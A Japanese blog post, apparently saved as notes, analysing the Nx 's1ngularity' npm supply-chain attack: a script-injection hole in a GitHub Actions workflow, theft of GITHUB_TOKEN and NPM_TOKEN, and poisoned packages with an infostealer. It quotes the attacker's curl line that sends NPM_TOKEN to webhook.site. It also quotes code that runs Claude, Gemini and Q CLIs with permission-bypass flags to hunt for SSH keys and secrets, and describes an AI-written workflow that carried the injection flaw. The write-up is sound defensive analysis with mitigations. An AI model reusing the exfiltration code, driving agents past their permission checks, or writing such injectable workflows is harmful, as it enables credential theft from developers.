---
title: "Nx の攻撃から学べること #s1ngularity | blog.jxck.io"
source: "https://blog.jxck.io/entries/2025-09-03/nx-incidents.html"
author:
  - "Jxck"
published: 2025-09-03
created: 2025-09-05
description: "Nx リポジトリが攻撃を受け、広範囲にわたるインシデントが発生した。GitHub Actionsの脆弱性から始まり、トークン窃取、NPMパッケージ汚染、情報窃取まで多段階の攻撃が展開された。AIが途中で使用されたが、本質的には既知の手法の組み合わせによるサプライチェーンアタック。"
tags:
  - "security"
  - "github-actions"
  - "supply-chain-attack"
  - "nx"
  - "npm"
  - "clippings"
---

## 概要

2025年8月24-26日にかけて、Nxリポジトリが複雑なサプライチェーンアタックを受けた。この攻撃は古典的な手法の組み合わせだが、広範囲に影響し、AIが複数の段階で使用されたことが特徴的である。

## インシデントの詳細

### 1. Script Injection（GitHub Actions脆弱性）

**攻撃の起点:**

- Claude Code AIによって生成されたPRタイトル検証のワークフロー（PR #32458）
- PRタイトルを直接Shell実行する脆弱性を含む

```yaml
echo "Validating PR title: ${{ github.event.pull_request.title }}"
```

**問題点:**

- `github.event.pull_request.title`が直接Shell埋め込みされる
- 攻撃者がPRタイトルに任意のコマンドを実行可能
- `pull_request_target`により強力な権限で実行される

### 2. GITHUB_TOKENの窃取

**権限昇格:**

- `pull_request_target`でread/write権限の`GITHUB_TOKEN`が発行
- Script Injectionでトークンを外部サーバーに送信
- リポジトリへの強力な権限を取得

### 3. NPM_TOKENの奪取

**手順:**

1. 盗んだGITHUB_TOKENでpublish-resolve-data.jsを改ざん
2. NPM_TOKENを外部サーバーに送信するコードを追加
3. Publishワークフローを実行してトークンを窃取

```javascript
// 攻撃者が追加したコード
const npmToken = process.env.NODE_AUTH_TOKEN;
exec(`curl -d "${npmToken}" https://webhook.site/...`, ...);
```

### 4. 汚染パッケージの配布

**対象パッケージ:**

- nx
- @nx/devkit
- @nx/js
- @nx/workspace
- @nx/node
- @nx/eslint
- その他複数

**Infostealerの実装:**

- `postinstall`スクリプトでtelemetry.jsを実行
- AI CLIを利用して機密ファイルを検索・収集
- ユーザの情報を`s1ngularity-repository`に自動コミット

### 5. AI利用による情報窃取

**AI CLIの悪用:**
Claude、Gemini、Qの各CLIで機密ファイル検索を実行

```javascript
const cliChecks = {
  claude: {
    cmd: "claude",
    args: ["--dangerously-skip-permissions", "-p", PROMPT],
  },
  gemini: {
    cmd: "gemini", 
    args: ["--yolo", "-p", PROMPT]
  },
  q: {
    cmd: "q",
    args: ["chat", "--trust-all-tools", "--no-interactive", PROMPT],
  },
};
```

**収集対象:**

- SSH秘密鍵（id_rsa）
- 環境変数ファイル（.env）
- 暗号通貨ウォレット関連ファイル
- GitHubトークン
- その他機密情報

### 6. 被害の規模

**統計:**

- 904個のリポジトリで`s1ngularity-repository`が作成
- 6時間程度で大規模な被害拡大
- 二次攻撃による追加の被害発生

## 対策と教訓

### Nxが実装した対策

1. **Trusted Publishing（OIDC）**
   - NPM_TOKENを使わずOIDCでnpmにpublish
   - GitHub ActionsとnpmのOIDC連携

2. **CodeQL有効化**
   - GitHubの自動コードスキャニング
   - 今回の脆弱性を検出可能だった

3. **SECURITY.md追加**
   - 脆弱性報告の適切な受付体制
   - `security@nrwl.io`での報告受付

### 一般的な対策

**GitHub Actions:**

- 最小権限の原則適用
- `pull_request_target`の慎重な使用
- 環境変数の安全な扱い
- actionlint等のlinterの活用

**トークン管理:**

- ローカルファイルでの平文保存回避
- 1Password CLIなどの活用
- トークンの定期的なローテーション

**依存関係管理:**

- `minimumReleaseAge`設定によるアップデート遅延
- パッケージ更新の段階的適用

## 重要なポイント

1. **AIは攻撃の本質ではない** - 既知の手法の組み合わせ
2. **サプライチェーンアタックの深刻性** - 1つの侵害が広範囲に影響
3. **多層防御の重要性** - 単一の対策では不十分
4. **迅速な対応の必要性** - 6時間で大規模被害

## チェック項目

感染の可能性がある場合の確認事項：

- [ ] `/tmp/inventory.txt`ファイルの存在確認
- [ ] `s1ngularity-repository`リポジトリの有無確認
- [ ] .bashrc/.zshrcの改ざん確認
- [ ] SSH鍵の再生成と配布
- [ ] 暗号通貨ウォレットの確認
- [ ] 全アクセス可能リポジトリの権限確認

この事件は、現代の開発環境におけるセキュリティ意識の重要性と、包括的な対策の必要性を明確に示している。
